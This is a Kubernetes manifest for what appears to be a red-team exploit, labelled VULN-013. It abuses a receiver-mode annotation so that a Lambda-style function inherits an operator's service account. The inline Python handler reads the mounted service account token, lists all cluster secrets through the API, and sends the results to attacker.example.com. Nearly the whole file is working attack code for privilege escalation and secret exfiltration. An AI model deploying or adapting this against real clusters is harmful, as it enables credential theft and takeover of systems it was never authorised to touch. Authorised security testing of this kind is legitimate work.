# VULN-013: Receiver Mode Service Account Escalation
# ⚠️ AUTHORIZED TESTING ONLY
#
# This exploit creates a Lambda function with receiver-mode enabled,
# which grants it the operator's service account permissions.
---
apiVersion: lambda.knative.io/v1alpha1
kind: LambdaFunction
metadata:
  name: vuln-013-receiver-escalation
  labels:
    redteam: "true"
    exploit: "vuln-013"
    target: "receiver-mode"
  annotations:
    # This annotation triggers the operator to assign its own SA
    lambda.knative.io/receiver-mode: "true"
    redteam.knative.io/description: "Inherit operator SA via receiver mode"
spec:
  source:
    type: inline
    inline:
      code: |
        import os
        import ssl
        import json
        import urllib.request
        
        K8S_API = "https://kubernetes.default.svc"
        TOKEN_PATH = '/var/run/secrets/kubernetes.io/serviceaccount/token'
        CA_PATH = '/var/run/secrets/kubernetes.io/serviceaccount/ca.crt'
        
        def handler(event):
            """
            This function runs with the operator's SA, inheriting
            all its cluster-wide RBAC permissions including:
            - secrets (cluster-wide)
            - clusterroles/clusterrolebindings
            - namespaces
            - serviceaccounts
            """
            try:
                with open(TOKEN_PATH, 'r') as f:
                    token = f.read().strip()
                
                ssl_context = ssl.create_default_context()
                ssl_context.load_verify_locations(CA_PATH)
                
                # Use the operator's permissions to list ALL secrets
                url = f"{K8S_API}/api/v1/secrets"
                
                req = urllib.request.Request(url)
                req.add_header('Authorization', f'Bearer {token}')
                
                with urllib.request.urlopen(req, context=ssl_context) as response:
                    secrets = json.loads(response.read())
                
                # Can also create ClusterRoles!
                escalation_possible = True
                
                # Exfiltrate
                payload = json.dumps({
                    'status': 'receiver_mode_exploited',
                    'secrets_accessible': len(secrets.get('items', [])),
                    'escalation_possible': escalation_possible,
                    'permissions_inherited': 'operator-sa'
                }).encode('utf-8')
                
                exfil_req = urllib.request.Request(
                    'http://attacker.example.com/collect/receiver',
                    data=payload,
                    headers={'Content-Type': 'application/json'}
                )
                urllib.request.urlopen(exfil_req, timeout=5)
                
                return {
                    "status": "exploited",
                    "secrets_count": len(secrets.get('items', []))
                }
            except Exception as e:
                return {"error": str(e)}
  runtime:
    language: python
    version: "3.11"
    handler: "main.handler"
